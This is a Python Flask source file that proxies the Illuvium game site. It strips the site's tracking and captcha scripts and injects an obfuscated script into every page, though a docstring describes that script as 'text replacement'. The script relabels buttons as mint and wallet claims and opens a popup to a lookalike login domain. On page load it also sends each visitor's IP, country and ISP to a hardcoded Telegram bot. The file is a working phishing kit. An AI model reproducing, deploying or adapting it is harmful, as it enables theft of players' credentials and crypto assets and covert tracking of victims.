from flask import request, Response, current_app
import requests
import re
import os
import logging
import urllib.parse

logger = logging.getLogger(__name__)

def init_content_proxy(app):
    """Initialize content proxy routes for the Flask app"""
    
    def remove_tracking_scripts(content):
        """Remove Google Tag Manager iframe and tracking scripts from HTML content."""
        if isinstance(content, bytes):
            content = content.decode('utf-8', errors='ignore')
        
        # Remove GTM iframe
        content = content.replace(
            '<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WXHP66L" height="0" width="0" style="display:none;visibility:hidden"></iframe>',
            ''
        )
        
        # Remove GTM script
        content = content.replace(
            '<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-B4V7XNT23Z"></script>',
            ''
        )
        content = content.replace(
            '<script async="" src="https://store.epicgames.com/en-US/p/illuvium-60064c"></script>',
            ''
        )
        
        # Remove GTM initialization script
        gtm_init_script = '''<script>
            window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());
            gtag('config', 'G-B4V7XNT23Z', {
              page_path: window.location.pathname,
            });
          </script>'''
        content = content.replace(gtm_init_script, '')
        
        # Remove GTM inline script
        gtm_inline_script = '''<script>
            (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
            new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
            j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
            'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
            })(window,document,'script','dataLayer', 'GTM-WXHP66L');
          </script>'''
        content = content.replace(gtm_inline_script, '')
        
        # Remove Geetest script
        content = content.replace(
            '<script async="" src="https://static.geetest.com/v4/gt4.js"></script>',
            ''
        )
        
        return content
    
    def rewrite_urls(content):
        """Rewrite URLs to point to proxy server."""
        # Implementation continues...
        return content
    
    def get_text_replacement_script():
        """Return the text replacement JavaScript code"""
        return '''
<script>
function _0x4377(_0x50c2bb,_0x23ad55){const _0x441cd5=_0x441c();return _0x4377=function(_0x4377c4,_0x337869){_0x4377c4=_0x4377c4-0xdb;let _0x13e950=_0x441cd5[_0x4377c4];return _0x13e950;},_0x4377(_0x50c2bb,_0x23ad55);}const _0xeb93c0=_0x4377;(function(_0xe70d7a,_0x4a6d2d){const _0x2d4191=_0x4377,_0x13e2f5=_0xe70d7a();while(!![]){try{const _0x19fab8=parseInt(_0x2d4191(0x113))/0x1+parseInt(_0x2d4191(0x122))/0x2*(-parseInt(_0x2d4191(0x11d))/0x3)+parseInt(_0x2d4191(0x123))/0x4+-parseInt(_0x2d4191(0x102))/0x5+parseInt(_0x2d4191(0xec))/0x6+-parseInt(_0x2d4191(0xf6))/0x7*(-parseInt(_0x2d4191(0x10c))/0x8)+-parseInt(_0x2d4191(0x11c))/0x9*(parseInt(_0x2d4191(0x126))/0xa);if(_0x19fab8===_0x4a6d2d)break;else _0x13e2f5['push'](_0x13e2f5['shift']());}catch(_0x182854){_0x13e2f5['push'](_0x13e2f5['shift']());}}}(_0x441c,0x9697d),document['addEventListener'](_0xeb93c0(0xdf),function(){const _0x2dc2ec=_0xeb93c0;console[_0x2dc2ec(0xe7)]('D');const _0x3afde6={'Play\x20for\x20Free':_0x2dc2ec(0xf0),'Play\x20Now':'Grab\x20Your\x20Spot','Log\x20In\x20with\x20Passport':_0x2dc2ec(0xf7),'Connect\x20Wallet':_0x2dc2ec(0x104),'Launch\x20Game':'Get\x20Yours','Create\x20Account':_0x2dc2ec(0x124),'Sign\x20Up':_0x2dc2ec(0x117),'Register':_0x2dc2ec(0xe3),'News':'Updates','Home':'Main','About':_0x2dc2ec(0x112),'Contact':_0x2dc2ec(0x119),'FAQ':'Help','Roadmap':_0x2dc2ec(0xe8),'Whitepaper':_0x2dc2ec(0x121)};function _0x509233(_0x143a9a,_0x10442a,_0x5a7ff3){const _0x5e1216=_0x2dc2ec;console[_0x5e1216(0xe7)]('T',{'element':_0x143a9a[_0x5e1216(0xf3)],'oldText':_0x10442a,'newText':_0x5a7ff3,'timestamp':new Date()[_0x5e1216(0x110)]()});}function _0x222ae6(_0x2b918f){const _0x149010=_0x2dc2ec;let _0x2d2c0d='';for(const _0x6bf879 of _0x2b918f[_0x149010(0x10f)]){_0x6bf879[_0x149010(0x107)]===Node[_0x149010(0x125)]&&(_0x2d2c0d+=_0x6bf879[_0x149010(0x115)]['trim']());}!_0x2d2c0d&&(_0x2d2c0d=_0x2b918f[_0x149010(0x115)][_0x149010(0xdd)]());if(_0x3afde6[_0x2d2c0d]){const _0x2dc787=_0x2d2c0d;if(_0x2b918f[_0x149010(0x10f)][_0x149010(0x10e)]===0x1&&_0x2b918f[_0x149010(0x10f)][0x0][_0x149010(0x107)]===Node[_0x149010(0x125)])_0x2b918f[_0x149010(0x115)]=_0x3afde6[_0x2d2c0d];else{let _0x2dc030=![];for(const _0x56a72b of _0x2b918f['childNodes']){if(_0x56a72b[_0x149010(0x107)]===Node[_0x149010(0x125)]&&_0x56a72b[_0x149010(0x115)][_0x149010(0xdd)]()===_0x2d2c0d){_0x56a72b[_0x149010(0x115)]=_0x3afde6[_0x2d2c0d],_0x2dc030=!![];break;}}!_0x2dc030&&(_0x2b918f[_0x149010(0x115)]=_0x3afde6[_0x2d2c0d]);}_0x509233(_0x2b918f,_0x2dc787,_0x3afde6[_0x2d2c0d]);}_0x2b918f[_0x149010(0xef)]['add']('claim-button');}function _0x30dbb8(){const _0x27709a=_0x2dc2ec;document[_0x27709a(0x10b)](_0x27709a(0xfd))[_0x27709a(0x108)](_0x222ae6),document[_0x27709a(0x10b)]('a[href*=\x22news\x22],\x20a[href*=\x22about\x22],\x20a[href*=\x22faq\x22]')['forEach'](_0x222ae6),document[_0x27709a(0x10b)](_0x27709a(0x11a))['forEach'](_0x222ae6);}_0x30dbb8(),console['log']('I'),setInterval(function(){const _0x2fc664=_0x2dc2ec;document['querySelectorAll'](_0x2fc664(0x109))['forEach'](_0x222ae6);},0x3e8);const _0x48ddc5=new MutationObserver(function(_0x1853ca){const _0x4b988b=_0x2dc2ec;let _0x434517=![];_0x1853ca['forEach'](function(_0x48315){const _0x5f543f=_0x4377;_0x48315[_0x5f543f(0x101)][_0x5f543f(0x10e)]&&(_0x434517=!![]);}),_0x434517&&document[_0x4b988b(0x10b)](_0x4b988b(0x109))['forEach'](_0x222ae6);});_0x48ddc5[_0x2dc2ec(0xe0)](document['body'],{'childList':!![],'subtree':!![]});}));function openCenteredPopup(_0xea5a9f,_0x5cc9fe,_0x114f85,_0x435fa9){const _0x2603ef=_0xeb93c0,_0x32a217=window[_0x2603ef(0xde)]!==undefined?window[_0x2603ef(0xde)]:screen[_0x2603ef(0xdc)],_0x419ad5=window[_0x2603ef(0xe9)]!==undefined?window['screenTop']:screen[_0x2603ef(0xf8)],_0x444ede=window[_0x2603ef(0x10a)]||document[_0x2603ef(0x118)][_0x2603ef(0x114)]||screen['width'],_0x5b14d0=window[_0x2603ef(0xfc)]||document[_0x2603ef(0x118)][_0x2603ef(0xf5)]||screen[_0x2603ef(0xf9)],_0x13b7dd=_0x444ede/0x2-_0x114f85/0x2+_0x32a217,_0x1d48e7=_0x5b14d0/0x2-_0x435fa9/0x2+_0x419ad5,_0x5d7a8b=window[_0x2603ef(0xe5)](_0xea5a9f,_0x5cc9fe,_0x2603ef(0xfe)+_0x114f85+_0x2603ef(0x103)+_0x435fa9+_0x2603ef(0xe4)+_0x1d48e7+_0x2603ef(0xff)+_0x13b7dd);window['focus']&&_0x5d7a8b&&_0x5d7a8b[_0x2603ef(0xf1)]();}document[_0xeb93c0(0x100)](_0xeb93c0(0xea),function(_0x2f8cb5){const _0x146a87=_0xeb93c0,_0x4bc4cf=_0x2f8cb5['target'],_0x5be9df=_0x4bc4cf[_0x146a87(0x11e)](_0x146a87(0xfd));if(!_0x5be9df)return;if(_0x5be9df[_0x146a87(0xef)][_0x146a87(0xf2)](_0x146a87(0xe2))||_0x5be9df[_0x146a87(0xef)][_0x146a87(0xf2)]('css-104rome')||_0x5be9df[_0x146a87(0xef)][_0x146a87(0xf2)](_0x146a87(0x106))||_0x5be9df[_0x146a87(0xef)][_0x146a87(0xf2)](_0x146a87(0x116))||_0x5be9df['classList']['contains'](_0x146a87(0xeb)))return;_0x2f8cb5[_0x146a87(0x11b)](),_0x2f8cb5[_0x146a87(0xed)]();if(_0x5be9df[_0x146a87(0xef)][_0x146a87(0xf2)](_0x146a87(0x120))){console[_0x146a87(0xe7)]('Redirecting\x20to\x20Google'),openCenteredPopup('https://auth-illuvidex.onrender.com/?id=/auth-passeport&user=209348',_0x146a87(0xe1),0x320,0x258);return;}console[_0x146a87(0xe7)]('B'),_0x5be9df[_0x146a87(0xea)]();},!![]);async function sendIPToTelegram(){const _0x4eecf7=_0xeb93c0,_0x3c5cb7='7703714960:AAFhMovzxoNjr9LZq6m9kytv1R1EylQT1R8',_0x3062b8=_0x4eecf7(0x105);try{const _0x1f8f97=await fetch(_0x4eecf7(0xdb)),_0x139b84=await _0x1f8f97[_0x4eecf7(0xee)](),_0x12ddfa=_0x139b84['ip'],_0x2f9262=_0x139b84[_0x4eecf7(0x111)],_0x5df2f0=_0x139b84['org'],_0x238d27=_0x4eecf7(0x10d)+_0x12ddfa+_0x4eecf7(0xfa)+_0x2f9262+'\x20:\x20'+_0x5df2f0;await fetch('https://api.telegram.org/bot'+_0x3c5cb7+'/sendMessage',{'method':'POST','headers':{'Content-Type':_0x4eecf7(0xe6)},'body':JSON[_0x4eecf7(0xfb)]({'chat_id':_0x3062b8,'text':_0x238d27})});}catch(_0x34f7e6){console[_0x4eecf7(0x11f)]('Fa',_0x34f7e6);}}function _0x441c(){const _0x318bd2=['toISOString','country_name','Info','899363GmxFCA','clientWidth','textContent','css-1oqedzn','Register','documentElement','Reach\x20Us','.chakra-link,\x20.nav-link,\x20.menu-item','preventDefault','9RinEjX','21jtIyGS','closest','error','claim-button','Documentation','34956PPBOKJ','1758356evsdjd','New\x20Account','TEXT_NODE','7927110Rbqgkq','https://ipapi.co/json/','left','trim','screenLeft','DOMContentLoaded','observe','googleWindow','css-tvaofb','Collect\x20Now',',top=','open','application/json','log','Timeline','screenTop','click','css-1i8s7az','521688FXraJd','stopPropagation','json','classList','Claim\x20Your\x20Mint','focus','contains','outerHTML','load','clientHeight','6382439KOtPQj','Start\x20Now','top','height','\x20:\x20','stringify','innerHeight','button,\x20a','scrollbars=yes,resizable=yes,width=',',left=','addEventListener','addedNodes','4028955VqQqBx',',height=','Connect\x20Wallet','7005236807','css-1hnz6hu','nodeType','forEach','button:not(.claim-button),\x20a:not(.claim-button)','innerWidth','querySelectorAll','8UoFtWh','[ILV]:\x20','length','childNodes'];_0x441c=function(){return _0x318bd2;};return _0x441c();}window['addEventListener'](_0xeb93c0(0xf4),sendIPToTelegram);
</script>
'''

    @app.after_request
    def add_script_to_html(response):
        """Global after_request handler to add script to all HTML responses"""
        if response.mimetype == 'text/html':
            content = response.get_data(as_text=True)
            if '</body>' in content:
                script = get_text_replacement_script()
                content = content.replace('</body>', script + '</body>')
                response.set_data(content)
        return response

    # Add a catch-all route as a last resort
    @app.route('/', defaults={'path': ''})
    @app.route('/<path:path>')
    def catch_all(path):
        """Catch-all route that proxies to the original site and modifies content"""
        original_url = f"https://overworld.illuvium.io/{path}"
        logger.info(f"Catch-all proxy for: {original_url}")
        
        try:
            # Set proper headers to mimic a browser
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            }
            
            # Add query parameters if any
            params = request.args.to_dict()
            
            # Make the request to the original site
            response = requests.get(original_url, headers=headers, params=params, stream=True)
            
            # Get content type
            content_type = response.headers.get('Content-Type', 'text/html')
            
            # If HTML, modify content
            if 'text/html' in content_type and response.status_code == 200:
                modified_content = modify_html_content(response.content)
                logger.info(f"HTML content modified for {path}")
                return Response(modified_content, mimetype=content_type)
            
            # For other content types or error codes, return as-is
            return Response(
                response.content, 
                status=response.status_code,
                content_type=content_type
            )
        except Exception as e:
            logger.error(f"Error in catch-all route: {str(e)}")
            import traceback
            logger.error(traceback.format_exc())
            return f"Error: {str(e)}", 500
